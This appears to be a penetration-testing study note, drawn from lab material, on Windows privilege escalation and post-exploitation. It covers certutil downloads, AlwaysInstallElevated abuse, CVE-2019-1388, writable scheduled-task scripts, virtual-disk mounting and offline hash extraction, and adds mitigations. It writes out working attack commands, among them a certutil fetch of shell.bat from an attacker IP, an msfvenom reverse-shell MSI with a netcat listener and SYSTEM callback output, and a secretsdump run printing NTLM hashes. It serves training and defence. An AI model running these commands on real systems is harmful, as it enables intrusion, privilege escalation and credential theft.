## Overview

Windows environments provide many privilege escalation and post-exploitation opportunities through native functionality, misconfigurations, and overlooked data sources.

This note covers:

- Living Off The Land Binaries and Scripts
- `certutil` file transfer and encoding
- `rundll32` DLL execution
- `AlwaysInstallElevated`
- `CVE-2019-1388`
- scheduled task enumeration and weak script permissions
- user and computer description fields
- mounting `.vhd`, `.vhdx`, and `.vmdk` files
- extracting local hashes from offline registry hives

---

# Living Off The Land Binaries and Scripts

## LOLBAS

LOLBAS stands for:

```text
Living Off The Land Binaries and Scripts
```

The LOLBAS project documents Microsoft-signed binaries, scripts, and libraries that are native to Windows or can be downloaded directly from Microsoft.

These files may provide unexpected functionality useful during an assessment.

Reference:

- [LOLBAS Project](https://lolbas-project.github.io/)

---

# Common LOLBAS Capabilities

LOLBAS entries may support:

| Capability | Examples |
|---|---|
| Code execution | running commands or payloads |
| Code compilation | compiling source on host |
| File transfer | downloading or uploading files |
| Persistence | maintaining access |
| UAC bypass | elevating through trusted binaries |
| Credential theft | abusing trusted tools |
| Process memory dumping | dumping LSASS or other processes |
| Keylogging | capturing user input |
| Evasion | blending into normal Windows activity |
| DLL hijacking | loading attacker-controlled DLLs |

> [!important]
> LOLBAS techniques are useful when tooling is restricted, when only native binaries are allowed, or during evasive assessments.

---

# Certutil File Transfer

## Why certutil Matters

`certutil.exe` is intended for certificate management, but it can also be used for:

- downloading files
- encoding files
- decoding files
- transferring payloads through copy/paste-safe base64

---

# Transfer File with certutil

Download a file from an HTTP server.

```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

## Command Breakdown

| Part | Purpose |
|---|---|
| `certutil.exe` | Windows certificate utility |
| `-urlcache` | Use URL cache retrieval functionality |
| `-split` | Split output where applicable |
| `-f` | Force overwrite |
| URL | Remote file to download |
| `shell.bat` | Output filename |

---

# Encode File with certutil

Encode a file as base64.

```cmd
certutil -encode file1 encodedfile
```

Example output:

```cmd
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

Use case:

```text
Convert binary or text content into copy/paste-safe base64.
```

---

# Decode File with certutil

Decode the base64 file back to its original contents.

```cmd
certutil -decode encodedfile file2
```

Example output:

```cmd
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

---

# rundll32 DLL Execution

## Why rundll32 Matters

`rundll32.exe` can execute exported functions from DLL files.

Use cases:

- execute a downloaded DLL
- execute a DLL from an SMB share
- trigger a reverse shell DLL
- test DLL loading behavior
- abuse trusted Windows binary execution paths

Example concept:

```text
rundll32.exe <dll_path>,<exported_function>
```

> [!note]
> The DLL must expose a compatible exported function for the intended execution method.

---

# AlwaysInstallElevated

## Overview

`AlwaysInstallElevated` is a Windows Installer policy misconfiguration.

When enabled for both the user and machine policy hives, MSI packages may install with elevated privileges.

Required policy paths:

```text
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
```

```text
User Configuration\Administrative Templates\Windows Components\Windows Installer
```

Setting:

```text
Always install with elevated privileges
```

Both must be enabled for practical exploitation.

---

# Enumerate AlwaysInstallElevated

Check the current user key.

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

Expected vulnerable output:

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Check the local machine key.

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Expected vulnerable output:

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Both values set to `0x1` indicate the policy is enabled.

---

# Generate Malicious MSI Package

Use `msfvenom` to generate an MSI payload.

```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

Example output:

```text
Swordfish4051@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

---

# Execute MSI Package

Upload the MSI to the target, start a listener, then execute with `msiexec`.

```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

## Flag Breakdown

| Flag | Purpose |
|---|---|
| `/i` | Install MSI package |
| `/quiet` | Quiet mode |
| `/qn` | No UI |
| `/norestart` | Do not restart system |

---

# Catch SYSTEM Shell

Start a listener.

```bash
nc -lnvp 9443
```

Expected callback:

```text
Swordfish4051@htb[/htb]$ nc -lnvp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

nt authority\system
```

Successful result:

```text
NT AUTHORITY\SYSTEM
```

---

# AlwaysInstallElevated Mitigation

Disable both Local Group Policy settings:

```text
Computer Configuration\Administrative Templates\Windows Components\Windows Installer\Always install with elevated privileges
```

```text
User Configuration\Administrative Templates\Windows Components\Windows Installer\Always install with elevated privileges
```

---

# CVE-2019-1388

## Overview

`CVE-2019-1388` is a Windows privilege escalation vulnerability in the Windows Certificate Dialog.

The vulnerability involves UAC and the certificate information dialog for signed executables.

A vulnerable signed executable can expose a certificate field rendered as a clickable hyperlink. When clicked from the UAC certificate dialog, it can launch a browser as:

```text
NT AUTHORITY\SYSTEM
```

The browser can then be abused to launch `cmd.exe` or `powershell.exe` as SYSTEM.

Microsoft patched this issue in November 2019.

Reference:

- [Microsoft Security Update Guide – CVE-2019-1388](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1388)

---

# CVE-2019-1388 Technical Notes

The issue relates to signed binaries whose certificate contains Object Identifier:

```text
1.3.6.1.4.1.311.2.1.10
```

This OID is identified in `wintrust.h` as:

```text
SPC_SP_AGENCY_INFO_OBJID
```

This corresponds to the `SpcSpAgencyInfo` field in the certificate details.

If populated with a hyperlink, the `Issued By` field in the General tab can render as a clickable link.

A commonly referenced vulnerable Microsoft-signed executable is:

```text
hhupd.exe
```

---

# CVE-2019-1388 Exploitation Flow

## Step 1 – Run Executable as Administrator

Right-click the vulnerable executable:

```text
hhupd.exe
```

Select:

```text
Run as administrator
```

This opens a UAC prompt.

---

## Step 2 – Open Certificate Information

In the UAC prompt, click:

```text
Show information about the publisher's certificate
```

This opens the certificate dialog.

---

## Step 3 – Click Issuer Hyperlink

In the certificate dialog:

1. Review the certificate details.
2. Return to the `General` tab.
3. Click the hyperlink in the `Issued by` field.
4. Click `OK`.

A browser window should launch.

---

## Step 4 – Confirm Browser Runs as SYSTEM

Open Task Manager and check the browser process owner.

Expected process context:

```text
SYSTEM
```

---

## Step 5 – Break Out from Browser to CMD

In the SYSTEM browser:

1. Right-click the page.
2. Select:

```text
View page source
```

3. In the page source tab, right-click again.
4. Select:

```text
Save as
```

5. In the Save As dialog path field, enter:

```text
c:\windows\system32\cmd.exe
```

6. Press `Enter`.

Expected result:

```text
cmd.exe
```

running as:

```text
NT AUTHORITY\SYSTEM
```

> [!note]
> The documented steps were performed with Chrome. Other browsers may behave differently.

---

# Scheduled Tasks

## Why Scheduled Tasks Matter

Scheduled tasks may execute scripts or binaries as privileged users.

Misconfigurations can create privilege escalation opportunities when:

- a task runs as SYSTEM or Administrator
- the task executes a writable script
- the task binary path is writable
- a task folder is mispermissioned
- task files are readable or writable by standard users
- scripts are stored in writable directories such as `C:\Scripts`

---

# Enumerate Scheduled Tasks with schtasks

```cmd
schtasks /query /fo LIST /v
```

Example output:

```cmd
C:\htb> schtasks /query /fo LIST /v

Folder: \
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\.NET Framework
HostName:                             WINLPE-SRV01
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        5/27/2021 12:23:27 PM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Run As User:                          SYSTEM
Schedule Type:                        On demand only

<SNIP>
```

Interesting field:

```text
Run As User: SYSTEM
```

---

# Enumerate Scheduled Tasks with PowerShell

```powershell
Get-ScheduledTask | select TaskName,State
```

Example output:

```powershell
PS C:\htb> Get-ScheduledTask | select TaskName,State

TaskName                                                State
--------                                                -----
.NET Framework NGEN v4.0.30319                          Ready
.NET Framework NGEN v4.0.30319 64                       Ready
.NET Framework NGEN v4.0.30319 64 Critical              Disabled
.NET Framework NGEN v4.0.30319 Critical                 Disabled
AD RMS Rights Policy Template Management (Automated)    Disabled
AD RMS Rights Policy Template Management (Manual)       Ready
PolicyConverter                                         Disabled
SmartScreenSpecific                                     Ready
VerifiedPublisherCertStoreCheck                         Disabled
Microsoft Compatibility Appraiser                       Ready
ProgramDataUpdater                                      Ready
StartupAppTask                                          Ready
appuriverifierdaily                                     Ready
appuriverifierinstall                                   Ready
CleanupTemporaryState                                   Ready
DsSvcCleanup                                            Ready
Pre-staged app cleanup                                  Disabled

<SNIP>
```

---

# Scheduled Task Visibility Limitation

Standard users usually cannot list scheduled tasks created by other users.

Task files are stored in:

```text
C:\Windows\System32\Tasks
```

Standard users typically do not have read access to this directory.

However, administrators sometimes misconfigure permissions on task files, task folders, scripts, or directories used by scheduled tasks.

---

# Writable Scheduled Task Script Directory

## Scenario

A writable script directory exists:

```text
C:\Scripts
```

The directory contains scripts such as:

```text
db-backup.ps1
mailbox-backup.ps1
```

If these scripts are executed by a scheduled task running as SYSTEM or Administrator, modifying them can lead to privileged code execution.

---

# Check Permissions on C:\Scripts

Use `AccessChk`.

```cmd
accesschk64.exe /accepteula -s -d C:\Scripts\
```

Example output:

```cmd
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

Dangerous permission:

```text
RW BUILTIN\Users
```

This means standard users can write to the directory.

---

# Abuse Concept

If `BUILTIN\Users` can modify scripts that are run by a privileged scheduled task:

```text
Writable script
↓
Privileged scheduled task runs script
↓
Appended command executes as privileged account
↓
SYSTEM or admin callback
```

Example payload choices:

- beacon to C2
- reverse shell
- file write proof
- local admin creation
- credential collection
- command execution marker

> [!warning]
> Modifying production scripts can break business processes. Back up original files and make minimal changes.

---

# User and Computer Description Fields

## Why Description Fields Matter

Administrators sometimes store operational notes in account or computer description fields.

These fields may expose:

- passwords
- service account details
- system purpose
- maintenance notes
- application owners
- scanner accounts
- “do not change password” hints

This is more common in Active Directory but can also happen locally.

---

# Check Local User Description Fields

```powershell
Get-LocalUser
```

Example output:

```powershell
PS C:\htb> Get-LocalUser

Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password
sql_dev         True
```

Interesting account:

```text
secsvc
```

Interesting description:

```text
Network scanner - do not change password
```

This suggests the account may be tied to infrastructure scanning and may have access to additional systems.

---

# Check Computer Description Field

Use WMI.

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

Example output:

```powershell
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description

Description
-----------
The most vulnerable box ever!
```

Computer descriptions can reveal environment context or administrative notes.

---

# Mount VHDX / VMDK Files

## Why Virtual Disks Matter

During file share or local enumeration, virtual disk files may expose entire system backups.

Interesting extensions:

```text
.vhd
.vhdx
.vmdk
```

| Extension | Meaning | Common Platform |
|---|---|---|
| `.vhd` | Virtual Hard Disk | Hyper-V |
| `.vhdx` | Virtual Hard Disk v2 | Hyper-V |
| `.vmdk` | Virtual Machine Disk | VMware |

Virtual disks may contain:

- Windows registry hives
- local account hashes
- SSH keys
- database files
- web configs
- saved credentials
- application secrets
- user documents
- browser data
- service configuration files

---

# Finding Virtual Disks

Use tools like Snaffler to search shares for high-value files.

Reference:

- [Snaffler](https://github.com/SnaffCon/Snaffler)

Manual filename searches should include:

```text
*.vhd
*.vhdx
*.vmdk
```

Example PowerShell search:

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -ErrorAction SilentlyContinue
```

On shares, look for filenames matching hostnames.

Example:

```text
SQL01-disk1.vmdk
WEBSRV10.vhdx
```

---

# Mount VMDK on Linux

Use `guestmount`.

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

## Flag Breakdown

| Flag | Purpose |
|---|---|
| `-a` | Add disk image |
| `-i` | Inspect OS and mount automatically |
| `--ro` | Read-only mount |
| `/mnt/vmdk` | Mount point |

> [!important]
> Mount images read-only to avoid modifying evidence or corrupting the disk.

---

# Mount VHD / VHDX on Linux

```bash
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

## Flag Breakdown

| Flag | Purpose |
|---|---|
| `--add` | Add disk image |
| `--ro` | Read-only mount |
| `-m /dev/sda1` | Mount partition |
| `/mnt/vhdx/` | Mount point |

---

# Mount VHD / VHDX on Windows

Options:

- right-click the file and select `Mount`
- use Disk Management
- use PowerShell `Mount-VHD`

Example PowerShell pattern:

```powershell
Mount-VHD -Path "C:\Path\To\WEBSRV10.vhdx" -ReadOnly
```

After mounting, the virtual disk appears as a lettered drive.

---

# Mount VMDK on Windows

Options:

- right-click and select `Map Virtual Disk`
- use VMware Workstation:

```text
File > Map Virtual Disks
```

- attach the `.vmdk` to an analysis VM as an additional virtual hard drive
- extract files with 7-Zip where supported

Reference retained from notes:

- [Accessing files on a VMDK file](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/)

---

# Extract Local Hashes from Mounted Windows Disk

## Why Registry Hives Matter

A mounted Windows disk may expose registry hives from:

```text
C:\Windows\System32\Config
```

Important hives:

```text
SAM
SECURITY
SYSTEM
```

These can be processed offline to extract local account hashes.

---

# Registry Hive Paths

On the mounted disk, locate:

```text
<MountedDrive>\Windows\System32\Config\SAM
<MountedDrive>\Windows\System32\Config\SECURITY
<MountedDrive>\Windows\System32\Config\SYSTEM
```

Copy these files to the analysis host.

---

# Retrieve Hashes with secretsdump.py

Use Impacket `secretsdump.py`.

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

Example output:

```text
Swordfish4051@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)

<SNIP>
```

Potential results:

- local Administrator NTLM hash
- local user hashes
- cached domain logon hashes
- LSA secrets, depending on available hives

---

# Practical Decision Tree

## Are native binaries useful?

Check LOLBAS options when:

- file transfer tools are blocked
- PowerShell is restricted
- custom tooling is flagged
- only Microsoft-signed binaries are allowed

Start with:

```text
certutil
rundll32
```

---

## Is AlwaysInstallElevated enabled?

Check both keys:

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

If both are set to `0x1`, MSI execution may elevate.

---

## Is GUI access available on a vulnerable system?

If the host is unpatched and GUI access exists, check for `CVE-2019-1388`.

Look for:

- vulnerable Windows version
- UAC prompt
- signed executable with vulnerable certificate field
- browser launching as SYSTEM

---

## Are scheduled tasks interesting?

Enumerate:

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | select TaskName,State
```

Then check writable task scripts and directories.

---

## Are description fields leaking hints?

Check:

```powershell
Get-LocalUser
```

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

Follow up on service-like accounts or operational comments.

---

## Are virtual disks present?

Search for:

```text
*.vhd
*.vhdx
*.vmdk
```

Mount read-only and review:

```text
Windows\System32\Config
Users
inetpub
ProgramData
SSH directories
application config directories
```

---

# Troubleshooting

## certutil download fails

Possible causes:

- outbound HTTP blocked
- proxy required
- Defender or EDR blocks `certutil`
- wrong URL
- local write path blocked
- web server not listening

---

## MSI execution does not return shell

Possible causes:

- one `AlwaysInstallElevated` key missing
- payload architecture issue
- listener not running
- outbound connection blocked
- MSI blocked by policy
- endpoint protection blocks payload
- incorrect payload LHOST/LPORT

---

## CVE-2019-1388 browser does not launch as SYSTEM

Possible causes:

- host is patched
- wrong executable
- certificate field does not contain hyperlink
- browser behavior differs
- UAC prompt behavior changed
- no GUI interaction available

---

## Scheduled task script modification does not trigger

Possible causes:

- script not used by task
- task runs infrequently
- task runs under low-privileged user
- script path changed
- script syntax broken
- endpoint protection blocks payload
- no outbound network path

---

## VHDX / VMDK mount fails

Possible causes:

- corrupted disk image
- unsupported format
- missing guestmount dependencies
- partition mismatch
- encrypted disk
- image still in use
- insufficient permissions
- mount point does not exist

---

## secretsdump fails on offline hives

Check:

- `SAM`, `SECURITY`, and `SYSTEM` are from the same machine
- paths are correct
- files are not corrupted
- hives were fully copied
- command uses `LOCAL`
- file permissions allow reading

---

# Command Reference

## Download file with certutil

```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

## Encode file with certutil

```cmd
certutil -encode file1 encodedfile
```

## Decode file with certutil

```cmd
certutil -decode encodedfile file2
```

## Check AlwaysInstallElevated HKCU

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

## Check AlwaysInstallElevated HKLM

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

## Generate MSI payload

```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

## Execute MSI silently

```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

## Start listener

```bash
nc -lnvp 9443
```

## Enumerate scheduled tasks with schtasks

```cmd
schtasks /query /fo LIST /v
```

## Enumerate scheduled tasks with PowerShell

```powershell
Get-ScheduledTask | select TaskName,State
```

## Check directory permissions with AccessChk

```cmd
accesschk64.exe /accepteula -s -d C:\Scripts\
```

## Check local user descriptions

```powershell
Get-LocalUser
```

## Check computer description

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

## Search for virtual disks

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -ErrorAction SilentlyContinue
```

## Mount VMDK on Linux

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

## Mount VHDX on Linux

```bash
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

## Mount VHDX on Windows

```powershell
Mount-VHD -Path "C:\Path\To\WEBSRV10.vhdx" -ReadOnly
```

## Extract hashes from offline hives

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

# Cleanup Checklist

Remove staged files:

```text
shell.bat
encodedfile
decoded files
aie.msi
payload DLLs
modified scripts
temporary copied registry hives
mounted disk copies
extracted hashes
```

Restore modified scripts:

```text
db-backup.ps1
mailbox-backup.ps1
any modified scheduled task script
```

Unmount virtual disks:

```powershell
Dismount-VHD -Path "C:\Path\To\WEBSRV10.vhdx"
```

or unmount Linux mount points:

```bash
guestunmount /mnt/vmdk
guestunmount /mnt/vhdx
```

Document:

- vulnerable policy keys
- scheduled task or script path
- modified files
- callback evidence
- disk image source
- hives extracted
- cleanup actions completed

---

# Defensive Notes

## LOLBAS Defensive Controls

Monitor suspicious use of:

```text
certutil.exe
rundll32.exe
msiexec.exe
```

Examples:

- `certutil` downloading from external URLs
- `certutil` encoding or decoding unexpected files
- `rundll32` loading DLLs from user-writable paths
- `msiexec` installing MSI files from user profiles

---

## AlwaysInstallElevated Mitigation

Disable both policy settings.

Ensure both registry keys are absent or set to `0`.

Monitor:

- MSI execution from user-writable directories
- silent `msiexec` installs
- new local administrators
- Windows Installer policy changes

---

## CVE-2019-1388 Mitigation

Apply the November 2019 patch and ensure systems remain updated.

Monitor:

- unusual UAC interactions
- browsers launched as SYSTEM
- `cmd.exe` or `powershell.exe` spawned from browser processes

---

## Scheduled Task Hardening

Defenders should:

- restrict write access to task scripts
- avoid storing task scripts in broadly writable directories
- review `C:\Scripts` and similar folders
- monitor scheduled task changes
- monitor script modifications
- use least privilege for scheduled task accounts

---

## Virtual Disk Exposure Mitigation

Defenders should:

- restrict access to backup shares
- inventory `.vhd`, `.vhdx`, and `.vmdk` files
- protect virtual disk backups
- encrypt sensitive VM disks
- avoid storing VM backups on broadly readable shares
- monitor access to virtual disk files
- rotate passwords if offline hives are exposed

---

# Key Takeaways

- LOLBAS binaries provide powerful native functionality for file transfer, execution, and evasion.
- `certutil` can download, encode, and decode files.
- `rundll32` can execute DLL payloads when compatible exports exist.
- `AlwaysInstallElevated` is exploitable only when both HKCU and HKLM policy keys are enabled.
- Malicious MSI packages can execute as SYSTEM when AlwaysInstallElevated is misconfigured.
- `CVE-2019-1388` abuses certificate dialog behavior to launch a SYSTEM browser and break out to CMD.
- Scheduled tasks can be abused when privileged tasks execute writable scripts.
- User and computer description fields may leak operational hints or credentials.
- `.vhd`, `.vhdx`, and `.vmdk` files can expose full operating system backups.
- Offline `SAM`, `SECURITY`, and `SYSTEM` hives can be processed with `secretsdump.py`.
- Small enumeration findings can combine into major privilege escalation paths.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[LOLBAS]]
- [[certutil]]
- [[rundll32]]
- [[AlwaysInstallElevated]]
- [[msiexec]]
- [[CVE-2019-1388]]
- [[Scheduled Tasks]]
- [[AccessChk]]
- [[Snaffler]]
- [[Virtual Hard Disks]]
- [[VHDX]]
- [[VMDK]]
- [[secretsdump]]
- [[Registry Hives]]
- [[Credential Hunting]]

---

# Tags

#windows
#privilege-escalation
#lolbas
#certutil
#rundll32
#alwaysinstallelevated
#msiexec
#cve-2019-1388
#scheduled-tasks
#accesschk
#user-description
#vhd
#vhdx
#vmdk
#secretsdump
#credential-hunting
#pentesting